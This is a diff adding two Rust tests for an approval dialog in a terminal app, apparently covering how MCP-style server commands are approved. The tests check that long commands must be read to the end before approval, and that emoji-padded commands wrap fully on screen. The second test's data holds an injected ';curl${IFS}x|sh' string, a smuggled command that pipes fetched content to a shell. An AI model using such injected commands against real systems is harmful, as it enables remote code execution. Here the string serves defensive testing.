@@ -246,6 +246,119 @@ fn approving_sends_exactly_the_command_shown() {
     }
 }
 
+/// RV-DS241-206: on a 24-row terminal the approval box for an every-project server keeps
+/// its buttons on screen and shows a long command a window at a time; Enter never approves
+/// before the command's last line has shown, and approves the exact command once it has.
+#[test]
+fn a_long_command_in_the_global_approval_box_is_read_to_its_end_before_enter_approves() {
+    let args: Vec<String> = (0..80)
+        .map(|index| format!("--option-{index:02}"))
+        .collect();
+    let words: Vec<&str> = args.iter().map(String::as_str).collect();
+    let spec = stdio("/opt/homebrew/bin/uvx", &words);
+    let mut ctx = plugin_ctx(80, 24);
+    let waiting = server("long", spec.clone(), ServerStatus::WaitingForApproval);
+    let mut screen = Plugins::with(Vec::new(), vec![waiting]);
+    let body = |screen: &Plugins, ctx: &Ctx| {
+        screen
+            .modal(ctx)
+            .map(|(modal, _)| texts(&modal.body))
+            .unwrap_or_default()
+    };
+    screen.key(&Key::Enter, &mut ctx);
+
+    let window = |body: &[String]| -> Vec<String> {
+        body.iter()
+            .skip_while(|line| !line.starts_with("Runs"))
+            .take_while(|line| !line.starts_with("Lines ") && !line.starts_with("Projects"))
+            .map(|line| line.chars().skip(LABEL_WIDTH).collect())
+            .collect()
+    };
+    let first = body(&screen, &ctx);
+    screen.key(&Key::Enter, &mut ctx);
+    let early = ctx.next_request();
+    let mut read: Vec<String> = Vec::new();
+    let mut top = 0;
+    let mut previous: Vec<String> = Vec::new();
+    for step in 0..=40 {
+        if step > 0 {
+            screen.key(&Key::Down, &mut ctx);
+        }
+        let shown = window(&body(&screen, &ctx));
+        if !previous.is_empty() && shown != previous {
+            top += 1;
+        }
+        for (at, line) in shown.iter().enumerate() {
+            if top + at == read.len() {
+                read.push(line.clone());
+            }
+        }
+        previous = shown;
+    }
+    let last = body(&screen, &ctx);
+    screen.key(&Key::Enter, &mut ctx);
+    let late = ctx.next_request();
+
+    let rows = usize::from(ctx.height);
+    assert!(
+        first.len() + 2 <= rows,
+        "{} rows: {first:?}",
+        first.len() + 2
+    );
+    assert!(
+        first
+            .last()
+            .is_some_and(|line| line.contains("[> Approve ]")),
+        "{first:?}"
+    );
+    assert!(last.len() + 2 <= rows, "{} rows: {last:?}", last.len() + 2);
+    assert!(early.is_none(), "Enter approved with the command unread");
+    assert_eq!(read.concat(), crate::memory::visible_text(&spec.runs()));
+    assert!(
+        matches!(
+            &late,
+            Some(Request::Settings(job)) if matches!(
+                &**job,
+                SettingsJob::Plugin(PluginChange::Approve { id, spec: sent })
+                    if id == "server-long" && *sent == spec
+            )
+        ),
+        "the approval that followed the end was not sent"
+    );
+}
+
+/// B13-1 (rv-code2): a command whose one word holds emoji-presentation pairs is cut where
+/// the box draws it, so no row of what it runs is wider than the room beside its label, and
+/// the rows read back as the whole command, none hidden past the box's edge.
+#[test]
+fn an_emoji_command_in_the_global_approval_box_never_draws_past_its_room() {
+    let word = format!("{};curl${{IFS}}x|sh", "\u{263a}\u{fe0f}".repeat(35));
+    let spec = stdio("/opt/homebrew/bin/uvx", &[word.as_str()]);
+    let mut ctx = plugin_ctx(80, 24);
+    let waiting = server("emoji", spec.clone(), ServerStatus::WaitingForApproval);
+    let mut screen = Plugins::with(Vec::new(), vec![waiting]);
+    screen.key(&Key::Enter, &mut ctx);
+
+    let body = screen
+        .modal(&ctx)
+        .map(|(modal, _)| texts(&modal.body))
+        .unwrap_or_default();
+
+    let room = usize::from(MODAL_WIDTH) - 4 - LABEL_WIDTH;
+    let rows: Vec<String> = body
+        .iter()
+        .skip_while(|line| !line.starts_with("Runs"))
+        .take_while(|line| !line.starts_with("Lines ") && !line.starts_with("Projects"))
+        .map(|line| line.chars().skip(LABEL_WIDTH).collect())
+        .collect();
+    let drawn = crate::tui::screens::new_project_input::cells;
+    assert!(rows.len() > 1, "{body:?}");
+    for row in &rows {
+        assert!(drawn(row) <= room, "{} cells: {row}", drawn(row));
+    }
+    assert_eq!(rows.concat(), crate::memory::visible_text(&spec.runs()));
+}
+
 #[test]
 fn remove_asks_first() {
     let (skills, servers) = lists();
